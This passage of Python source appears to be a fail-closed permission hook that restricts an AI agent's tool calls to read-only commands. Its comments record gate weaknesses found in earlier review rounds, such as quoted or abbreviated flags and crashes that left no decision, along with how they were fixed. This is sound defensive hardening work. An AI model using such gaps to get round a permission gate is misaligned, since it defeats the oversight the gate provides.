                # The reachable trigger is a NUL byte in the payload `Cwd`, which
                # `scandir` rejects with ValueError — NOT the pattern. `glob` swallows
                # directory OSErrors internally, so an unreadable directory returns []
                # rather than raising — and the shell cannot expand one either (listing it
                # needs read permission), so keeping the literal below IS the shell's
                # behaviour, not a fail-open. Do not read this arm as protection
                # against unreadable directories; it is not (round 5, W3).
                return None
        if not matches:
            expanded.append(token)  # no match: the shell passes the pattern through
            continue
        if len(matches) > _MAX_GLOB_MATCHES or len(expanded) + len(matches) > _MAX_GLOB_MATCHES:
            return None
        expanded.extend(sorted(matches))
    return expanded


def _flags_allowed(base, args):
    """True iff every flag in `args` is permitted for `base` by _COMMAND_FLAG_POLICY.

    Long options match by PREFIX of an allowed name, so unambiguous abbreviations
    (`--lin` for `--lines`) work — the same relation the dangerous-option check uses,
    pointed the other way. A dangerous name is still refused first, so an abbreviation
    that could resolve to one is denied even if it also prefixes an allowed option.
    Anything unrecognised → deny.
    """
    policy = _COMMAND_FLAG_POLICY.get(base)
    if policy is None:
        return False
    allowed_short, allowed_long = policy
    for arg in args:
        if arg == "-" or not arg.startswith("-"):
            continue          # operand (`-` is stdin)
        if arg == "--":
            continue          # end-of-options separator
        if arg.startswith("--"):
            if _is_dangerous_long_option(arg):
                return False
            name = _long_option_name(arg)
            if not name or not any(full.startswith(name) for full in allowed_long):
                return False
            continue
        # Short cluster: every letter must be allowed. A value may be attached
        # (`-n20`), so digits and a trailing value are tolerated after a known letter.
        body = arg[1:].split("=", 1)[0]
        # `head -50` / `tail -20`: the obsolete all-numeric form of `-n 50`, still in
        # everyday use. It carries no letter to allowlist, so it is matched by shape.
        if body.isdigit() and base in _NUMERIC_SHORTHAND_COMMANDS:
            continue
        value_letters = _SHORT_VALUE_FLAGS.get(base, "")
        for ch in body:
            if ch not in allowed_short:
                return False
            if ch in value_letters:
                break         # the rest of the token is this flag's value
    return True


def _segment_is_readonly(tokens):
    """Return True iff one pipeline segment (a token list) is a read-only invocation."""
    if not tokens:
        # Empty segment == a leading `|`, a trailing `|`, or `a | | b`.
        return False
    # Guards run per TOKEN, so quoting a flag cannot hide it (round 2, C2).
    if any(_DANGEROUS_FLAG_TOKEN_RE.match(t) or _is_dangerous_long_option(t) for t in tokens):
        return False
    base = tokens[0]
    if base == "git":
        if len(tokens) < 2 or tokens[1] not in _READONLY_GIT_SUBCOMMANDS:
            return False
    elif base not in _READONLY_COMMANDS:
        return False
    if base == "git":
        return _git_subcommand_is_readonly(tokens)
    # Non-git commands: every flag must be on the command's own ALLOWLIST. An
    # allowlisted NAME is not the same as a read-only INVOCATION, and enumerating the
    # dangerous forms lost four rounds running (round 4, Note 3).
    return _flags_allowed(base, tokens[1:])


def decide(payload):
    """Return "allow" or "deny" for a single agy tool-call payload.

    Fail closed: anything not positively recognised as read-only → "deny".
    """
    if not isinstance(payload, dict):
        return "deny"
    tool_call = payload.get("toolCall")
    if not isinstance(tool_call, dict):
        return "deny"
    name = tool_call.get("name") or ""

    if name in _READ_TOOLS:
        return "allow"

    if name == "run_command":
        args = tool_call.get("args")
        if not isinstance(args, dict):
            return "deny"
        # agy payloads use CamelCase (CommandLine); accept the lowerCamel spelling too.
        cmd = args.get("CommandLine") or args.get("commandLine") or ""
        if not isinstance(cmd, str) or not cmd.strip():
            return "deny"
        if _METACHAR_RE.search(cmd):
            return "deny"
        segments = _tokenize(cmd)
        if segments is None or len(segments) > _MAX_PIPELINE_SEGMENTS:
            return "deny"
        roots = _expansion_roots(args.get("Cwd") or args.get("cwd"))
        # EVERY stage must be read-only: one write stage poisons the pipeline.
        # ONE deadline for the whole decision, created before the loop — see
        # `_expand_globs` for what a per-segment deadline cost.
        deadline = time.monotonic() + _GLOB_TIME_BUDGET_S
        for segment in segments:
            expanded = _expand_globs(segment, roots, deadline)
            if expanded is None or not _segment_is_readonly(expanded):
                return "deny"
        return "allow"

    # Any other tool (write_file, edit_file, replace, apply_patch, browser_*, …)
    # is not read-only.
    return "deny"


def main():
    try:
        raw = sys.stdin.read()
        payload = json.loads(raw)
    except Exception:
        payload = None  # fail closed
    try:
        decision = decide(payload)
    except Exception:
        # The contract at the top of this file is a decision on stdout, ALWAYS. An
        # exception escaping `decide` exits 1 with a traceback and NO json, handing
        # the verdict to agy's error handling instead of making it. That was not
        # hypothetical: `git cat-file -- x` raised TypeError through the round-6
        # `--filters` guard and produced empty stdout (round 7, W1). The guard itself
        # is fixed; this arm exists so the NEXT such bug still fails closed.
        decision = "deny"
    decision = decision if decision in ("allow", "deny") else "deny"
    # agy surfaces this reason to the MODEL (verified live: it quoted the string
    # back in its reply). A bare "denied" teaches it nothing, so it retries blind
    # variations and burns the print deadline — name the permitted surface and the
    # preferred alternative instead.
    #
    # The list below is deliberately NARROWER than what decide() allows, for two
    # different reasons — do not "fix" it by pasting the frozensets in:
    #   * `git remote` and `git config --get` pass this gate but are NOT granted in
    #     `_AGY_PERMISSION_RULES`, so agy's own permission layer auto-denies them one
    #     step earlier. Naming them would send the model after commands it can never
    #     run (spec-audit round 3).
    #   * the rarer read subcommands (`rev-parse`, `cat-file`, `describe`, `shortlog`,
    #     `ls-tree`, `merge-base`, `rev-list`, `diff-tree`) ARE fully reachable and are
    #     omitted purely for brevity — this string is read by a model that has just
    #     been denied, and a complete inventory buries the actionable part. Their
    #     absence is not a policy statement (cleanliness review, round 5).
    reason = "team-management read-only gate: {}".format(
        "read-only tool/command permitted" if decision == "allow"
        else (
            "denied — this run is read-only. Permitted: git "
            "status/diff/log/show/grep/branch/ls-files/blame, "
            "ls, cat, head, tail, grep, rg, wc, pwd, stat, nl, cut, tr, column "
            "(read flags only — an unrecognised flag is refused), and pipelines of "
            "these. Not permitted: writes, "
            "network, test/build runners, and any ';', '&&', '||', redirection or "
            "command substitution. To page a large file, use the view_file tool with a "
            "line range instead of shelling out."
        )
    )
    sys.stdout.write(json.dumps({"decision": decision, "reason": reason}))


if __name__ == "__main__":
    main()
